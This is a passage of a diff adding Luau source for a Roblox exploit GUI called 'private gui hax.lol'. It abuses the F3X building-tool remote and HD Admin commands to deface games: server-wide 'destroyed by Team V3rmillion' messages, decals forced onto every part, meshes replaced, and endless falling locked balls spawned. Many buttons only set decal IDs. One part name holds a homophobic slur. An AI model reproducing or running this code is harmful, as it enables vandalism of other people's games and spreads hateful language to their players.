+					setanchor(v, false)
+				end
+			end
+		end
+	
+		unanchorall()
+	
+		RequestCommand:InvokeServer(";sm This game has destroyed by Team V3rmillion")
+	
+		task.wait(0.5)
+	
+		RequestCommand:InvokeServer(";sh This game has destroyed by team V3rmillion")
+	end)
+end;
+task.spawn(C_a4);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_a6()
+local script = G2L["a6"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local id = "6871067853"
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";time 0 ;fogcolor black ;unfog")
+	
+		local Players = game:GetService("Players")
+		local Workspace = game:GetService("Workspace")
+		local player = Players.LocalPlayer
+	
+		local function findTool()
+			local char = player.Character or player.CharacterAdded:Wait()
+			for _, v in ipairs(char:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(player.Backpack:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+		end
+	
+		local tool = findTool()
+		if not tool then return end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		local function ohno(args)
+			task.spawn(function()
+				pcall(function()
+					remote:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local hack = Workspace:FindFirstChild("kys")
+		if hack then
+			ohno({"Remove", { hack }})
+		end
+	
+		local char = player.Character or player.CharacterAdded:Wait()
+		local hrp = char:WaitForChild("HumanoidRootPart")
+		local cf = CFrame.new(hrp.Position + Vector3.new(0, 1000, 0))
+	
+		local sky = remote:InvokeServer("CreatePart", "Normal", cf, Workspace)
+	
+		ohno({"SyncAnchor", { { Part = sky, Anchored = true } }})
+		ohno({"SyncCollision", { { Part = sky, CanCollide = false } }})
+		ohno({"CreateMeshes", { { Part = sky } }})
+		ohno({"SyncMesh", { {
+			Part = sky,
+			MeshId = "rbxassetid://111891702759441",
+			TextureId = "rbxassetid://" .. id,
+			Scale = Vector3.new(100999, 100999, 100999),
+			VertexColor = Vector3.new(4, 4, 4)
+		} }})
+		ohno({"SetLocked", { sky }, true})
+		ohno({"SetName", { sky }, "kys"})
+		ohno({"SyncMaterial", { { Part = sky, Transparency = tonumber(trans) } }})
+		ohno({"SyncMove", { { Part = sky, CFrame = cf } }})
+	end)
+end;
+task.spawn(C_a6);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_a8()
+local script = G2L["a8"];
+	-- yes
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		-- method task.spawn by yoid and 1sw0rd1
+		-- credit to theses 2
+	
+		local Players = game:GetService("Players")
+		local Workspace = game:GetService("Workspace")
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	
+		local decalID = "6871067853"
+		local id = decalID
+	
+		local player = Players.LocalPlayer
+	
+		local tool = nil
+		for _, v in pairs(player:GetDescendants()) do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+				break
+			end
+		end
+	
+		if not tool then
+			for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+					break
+				end
+			end
+		end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		local allParts = {}
+		for _, v in pairs(Workspace:GetDescendants()) do
+			if v:IsA("BasePart") and v.Name ~= "Terrain" and v.Name ~= "kys" then
+				table.insert(allParts, v)
+			end
+		end
+	
+		local faces = {"Front", "Back", "Right", "Left", "Bottom", "Top"}
+		local faceEnums = {
+			Front = Enum.NormalId.Front,
+			Back = Enum.NormalId.Back,
+			Right = Enum.NormalId.Right,
+			Left = Enum.NormalId.Left,
+			Bottom = Enum.NormalId.Bottom,
+			Top = Enum.NormalId.Top
+		}
+	
+		for _, faceName in pairs(faces) do
+			task.spawn(function()
+				local faceEnum = faceEnums[faceName]
+				local createList = {}
+				local addList = {}
+				for i = 1, #allParts do
+					local part = allParts[i]
+					createList[i] = {Part = part, Face = faceEnum, TextureType = "Decal"}
+					addList[i] = {Part = part, Face = faceEnum, TextureType = "Decal", Texture = "rbxassetid://" .. id}
+				end
+				remote:InvokeServer('CreateTextures', createList)
+				remote:InvokeServer('SyncTexture', addList)
+			end)
+		end
+	
+		local function send(args)
+			remote:InvokeServer(unpack(args))
+		end
+	
+		local function setCollision(part, bool)
+			task.spawn(function() send({"SyncCollision", {{Part = part, CanCollide = bool}}}) end)
+		end
+	
+		local function setAnchor(bool, part)
+			task.spawn(function() send({"SyncAnchor", {{Part = part, Anchored = bool}}}) end)
+		end
+	
+		local function newPart(cf, parent)
+			task.spawn(function() send({"CreatePart", "Normal", cf, parent}) end)
+		end
+	
+		local function killPart(part)
+			task.spawn(function() send({"Remove", {part}}) end)
+		end
+	
+		local function movePart(part, cf)
+			task.spawn(function() send({"SyncMove", {{Part = part, CFrame = cf}}}) end)
+		end
+	
+		local function resizePart(part, sz, cf)
+			task.spawn(function() send({"SyncResize", {{Part = part, CFrame = cf, Size = sz}}}) end)
+		end
+	
+		local function addMeshToPart(part)
+			task.spawn(function() send({"CreateMeshes", {{Part = part}}}) end)
+		end
+	
+		local function changeMesh(part, meshId)
+			task.spawn(function() send({"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshId}}}) end)
+		end
+	
+		local function changeTexture(part, texId)
+			task.spawn(function() send({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texId}}}) end)
+		end
+	
+		local function renamePart(part, newName)
+			task.spawn(function() send({"SetName", {part}, newName}) end)
+		end
+	
+		local function scaleMesh(part, scaleVal)
+			task.spawn(function() send({"SyncMesh", {{Part = part, Scale = scaleVal}}}) end)
+		end
+	
+		local function weldParts(partA, partB, leader)
+			task.spawn(function() send({"CreateWelds", {partA, partB}, leader}) end)
+		end
+	
+		local function lockPart(part, bool)
+			task.spawn(function() send({"SetLocked", {part}, bool}) end)
+		end
+	
+		local function setTransparency(part, val)
+			task.spawn(function() send({"SyncMaterial", {{Part = part, Transparency = val}}}) end)
+		end
+	
+		local function addSpotlight(part)
+			task.spawn(function() send({"CreateLights", {{Part = part, LightType = "SpotLight"}}}) end)
+		end
+	
+		local function setLightBrightness(part, brightness)
+			task.spawn(function() send({"SyncLighting", {{Part = part, LightType = "SpotLight", Brightness = brightness}}}) end)
+		end
+	
+		local function recolorPart(part, colorVal)
+			task.spawn(function() send({"SyncColor", {{Part = part, Color = colorVal, UnionColoring = false}}}) end)
+		end
+	
+		local function spawnDecalOnFace(part, side)
+			task.spawn(function() send({"CreateTextures", {{Part = part, Face = side, TextureType = "Decal"}}}) end)
+		end
+	
+		local function addDecalToFace(part, assetId, side)
+			task.spawn(function() send({"SyncTexture", {{Part = part, Face = side, TextureType = "Decal", Texture = "rbxassetid://" .. assetId}}}) end)
+		end
+	
+		for i = 1, #allParts do
+			task.spawn(setTransparency, allParts[i], 0)
+		end
+	end)
+end;
+task.spawn(C_a8);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_fa()
+local script = G2L["fa"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "103910913741524"
+	end)
+end;
+task.spawn(C_fa);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_fc()
+local script = G2L["fc"];
+	script.Parent.MouseButton1Click:Connect(function()
+		
+		
+		
+	end)
+end;
+task.spawn(C_fc);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_fe()
+local script = G2L["fe"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "99029040030660"
+	end)
+end;
+task.spawn(C_fe);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_100()
+local script = G2L["100"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "178993745"
+	end)
+end;
+task.spawn(C_100);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_102()
+local script = G2L["102"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "79849346731800"
+	end)
+end;
+task.spawn(C_102);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_104()
+local script = G2L["104"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "95740991147385"
+	end)
+end;
+task.spawn(C_104);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_106()
+local script = G2L["106"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "9422866248"
+	end)
+end;
+task.spawn(C_106);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_108()
+local script = G2L["108"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "358313209"	
+	end)
+end;
+task.spawn(C_108);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_10a()
+local script = G2L["10a"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "10973546714"
+	end)
+end;
+task.spawn(C_10a);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_10c()
+local script = G2L["10c"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "164661730"
+	end)
+end;
+task.spawn(C_10c);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_10e()
+local script = G2L["10e"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "113037858231151"	
+	end)
+end;
+task.spawn(C_10e);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_110()
+local script = G2L["110"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "113455072164836"	
+	end)
+end;
+task.spawn(C_110);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_112()
+local script = G2L["112"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "136316186191616"
+	end)
+end;
+task.spawn(C_112);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_114()
+local script = G2L["114"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "15636231615"
+	end)
+end;
+task.spawn(C_114);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_116()
+local script = G2L["116"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "119568569158868"
+	end)
+end;
+task.spawn(C_116);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_118()
+local script = G2L["118"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "278201190"
+	end)
+end;
+task.spawn(C_118);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_11a()
+local script = G2L["11a"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "22557646"
+	end)
+end;
+task.spawn(C_11a);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_11c()
+local script = G2L["11c"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "106010139163392"
+	end)
+end;
+task.spawn(C_11c);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_11e()
+local script = G2L["11e"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "14007385076"
+	end)
+end;
+task.spawn(C_11e);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_120()
+local script = G2L["120"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "131671978896344"
+	end)
+end;
+task.spawn(C_120);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_122()
+local script = G2L["122"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "109637144373047"
+		
+		
+	end)
+end;
+task.spawn(C_122);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_124()
+local script = G2L["124"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "1248503647"
+		
+	end)
+end;
+task.spawn(C_124);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_126()
+local script = G2L["126"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "14167462590"
+		
+		
+	end)
+end;
+task.spawn(C_126);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_128()
+local script = G2L["128"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "56369539"
+		
+		
+	end)
+end;
+task.spawn(C_128);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_12a()
+local script = G2L["12a"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "100208750092050"
+		
+		
+	end)
+end;
+task.spawn(C_12a);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_12c()
+local script = G2L["12c"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "16438486359"
+		
+		
+	end)
+end;
+task.spawn(C_12c);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_12e()
+local script = G2L["12e"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "92156141446654"
+		
+		
+	end)
+end;
+task.spawn(C_12e);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_130()
+local script = G2L["130"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "513601508"
+		
+		
+	end)
+end;
+task.spawn(C_130);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_132()
+local script = G2L["132"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "201208408"
+		
+		
+	end)
+end;
+task.spawn(C_132);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_134()
+local script = G2L["134"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "82985492849637"
+	end)
+end;
+task.spawn(C_134);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_136()
+local script = G2L["136"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "123970246979229"
+		
+	end)
+end;
+task.spawn(C_136);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_138()
+local script = G2L["138"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "78815692309604"
+		
+		
+	end)
+end;
+task.spawn(C_138);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_13a()
+local script = G2L["13a"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "73053804512950" -- taken from v3rmillion script destroy
+		
+		
+	end)
+end;
+task.spawn(C_13a);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_13b()
+local script = G2L["13b"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local Players = game:GetService("Players")
+		local player = Players.LocalPlayer
+	
+		local character = player.Character 
+	
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	
+	
+		local backpack = player.Backpack
+	
+		local function getf3x()
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(char:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+	
+			return nil
+		end
+	
+		-- get all info
+	
+		local f3x = getf3x()
+		if not f3x then
+			warn("where yo btools at")
+		end
+		local syncapi = f3x.SyncAPI
+		local serverendpoint = syncapi.ServerEndpoint
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local Players = game:GetService("Players")
+		local workspace = game:GetService("Workspace")
+		local player = Players.LocalPlayer
+	
+		local function findTools()
+			local char = player.Character or player.CharacterAdded:Wait()
+			for _, v in ipairs(char:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(player.Backpack:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+		end
+	
+		local tool = findTools()
+		if not tool then return end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+		local function call(a)
+			return remote:InvokeServer(unpack(a))
+		end
+	
+		local partsdata = {
+			"Ball",
+			"Cylinder",
+			"Normal"
+		}
+	
+		local function newBall(pos)
+			crex = math.random(100,270)
+			ball = remote:InvokeServer("CreatePart", partsdata[math.random(1, #partsdata)], pos, workspace)
+			task.spawn(function() call({ "SyncAnchor", { { Part = ball, Anchored = false } } }) end)
+			task.spawn(function() call({ "SyncColor", { { Part = ball, UnionColoring = false, Color = Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255)) } } }) end)
+			task.spawn(function() call({ "SetName", { ball }, "burn all faggots" }) end)
+			local fuckprotoskid = math.random(1, 2)
+			if fuckprotoskid == 1 then
+				task.spawn(function() call({ "SyncMaterial", { { Part = ball, Material = Enum.Material.Neon } } }) end)
+			end
+			if ball.Material ~= Enum.Material.Neon then
+				task.spawn(function() call({
+					"SyncSurface",
+					{
+						{
+							Part = ball,
+							Surfaces = {
+								Top = Enum.SurfaceType.Studs,
+								Front = Enum.SurfaceType.Studs,
+								Bottom = Enum.SurfaceType.Studs,
+								Right = Enum.SurfaceType.Studs,
+								Left = Enum.SurfaceType.Studs,
+								Back = Enum.SurfaceType.Studs
+							}
+						}
+					}
+					})
+	
+				end)
+			end
+			task.spawn(function() call({ "SetLocked", { ball }, true }) end)
+			task.spawn(function() call({
+				"SyncResize",
+				{{
+					Part = ball,
+					Size = Vector3.new(crex, crex, crex),
+					CFrame = ball.CFrame
+				}}
+				})
+			end)
+	
+		end
+	
+		task.spawn(function()
+			while true do
+				task.wait(0.1)
+	
+				local hrpcf = player.Character.HumanoidRootPart.CFrame
+				local x = hrpcf.x
+				local z = hrpcf.z
+				local randint = math.random(-600, 600)
+				local randint2 = math.random(-600, 600)
+				local xloc = randint + x
+				local zloc = randint2 + z
+				local cf = player.Character.HumanoidRootPart.CFrame.y + 400
+	
+				task.spawn(function()
+					newBall(CFrame.new(math.floor(xloc), math.random(cf, cf + 400), math.floor(zloc)))
+				end)
+			end
+		end)
+	end)
+end;
+task.spawn(C_13b);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_13d()
+local script = G2L["13d"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "118410101521277"
+		
+		
+	end)
+end;
+task.spawn(C_13d);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_13f()
+local script = G2L["13f"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "268499885"
+		
+		
+	end)
+end;
+task.spawn(C_13f);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_141()
+local script = G2L["141"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "9288455303"
+		
+		
+	end)
+end;
+task.spawn(C_141);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_143()
+local script = G2L["143"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "71745218266208"
+		
+		
+	end)
+end;
+task.spawn(C_143);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_145()
+local script = G2L["145"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "129692609632949"
+		
+		
+	end)
+end;
+task.spawn(C_145);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_147()
+local script = G2L["147"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "73574781174356"
+		
+		
+	end)
+end;
+task.spawn(C_147);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_149()
+local script = G2L["149"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "11946519620"
+		
+		
+	end)
+end;
+task.spawn(C_149);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_14b()
+local script = G2L["14b"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "106333494847896"
+		
+		
+	end)
+end;
+task.spawn(C_14b);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_14d()
+local script = G2L["14d"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "10678531272"
+		
+		
+	end)
+end;
+task.spawn(C_14d);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_14f()
+local script = G2L["14f"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "306861574"
+		
+		
+	end)
+end;
+task.spawn(C_14f);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_151()
+local script = G2L["151"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "7292161734"
+		
+		
+	end)
+end;
+task.spawn(C_151);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_153()
+local script = G2L["153"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "74885351"
+		
+		
+	end)
+end;
+task.spawn(C_153);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_155()
+local script = G2L["155"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "170539018"
+		
+		
+	end)
+end;
+task.spawn(C_155);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_157()
+local script = G2L["157"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "14769428618"
+		
+		
+	end)
+end;
+task.spawn(C_157);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_159()
+local script = G2L["159"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "5056743843"
+		
+		
+	end)
+end;
+task.spawn(C_159);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_15b()
+local script = G2L["15b"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local Players = game:GetService("Players")
+		local player = Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		for i,v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		remote = tool.SyncAPI.ServerEndpoint
+		function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+	
+		local function ohno(args)
+			task.spawn(function()
+				pcall(function()
+					remote:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local meshname = "Head"
+	
+		local partAllthingy = {}
+		for _, part in pairs(workspace:GetDescendants()) do
+			if part:IsA("BasePart") and part.Name ~= "Terrain" and part.Name ~= "kys" then
+				table.insert(partAllthingy, part)
+			end
+		end
+	
+		for _, part in pairs(partAllthingy) do
+			task.spawn(function()
+				ohno({"CreateMeshes", {{Part = part}}})
+				ohno({"SyncMesh", {{Part = part, MeshType = meshname, Scale = Vector3.new(1, 1, 1)}}})
+			end)
+		end
+	end)
+end;
+task.spawn(C_15b);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_15d()
+local script = G2L["15d"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "10957250204"
+		
+		
+	end)
+end;
+task.spawn(C_15d);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_15f()
+local script = G2L["15f"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "97498821202018"
+		
+		
+	end)
+end;
+task.spawn(C_15f);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_161()
+local script = G2L["161"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "114579783737121"
+		
+		
+	end)
+end;
+task.spawn(C_161);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_163()
+local script = G2L["163"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "104448952673567"
+		
+		
+	end)
+end;
+task.spawn(C_163);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_165()
+local script = G2L["165"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "113197003713530"
+		
+		
+	end)
+end;
+task.spawn(C_165);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_167()
+local script = G2L["167"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "118485869160897"
+		
+		
+	end)
+end;
+task.spawn(C_167);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_169()
+local script = G2L["169"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "88792823916635"
+		
+		
+	end)
+end;
+task.spawn(C_169);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_16b()
+local script = G2L["16b"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "125148536957515"
+		
+		
+	end)
+end;
+task.spawn(C_16b);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_16d()
+local script = G2L["16d"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "158118263"
+		
+		
+	end)
+end;
+task.spawn(C_16d);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_16f()
+local script = G2L["16f"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "115885657660241"
+		
+		
+	end)
+end;
+task.spawn(C_16f);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.ImageDecal.LocalScript
+function C_171()
+local script = G2L["171"];
+	local textbox = script.Parent.Parent.TextBoxDecal
+	local image = script.Parent
+	
+	textbox:GetPropertyChangedSignal("Text"):Connect(function()
+		image.Image = "rbxassetid://" .. textbox.Text
+	end)
+end;
+task.spawn(C_171);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Set Flashing SkyBox.LocalScript
+function C_174()
+local script = G2L["174"];
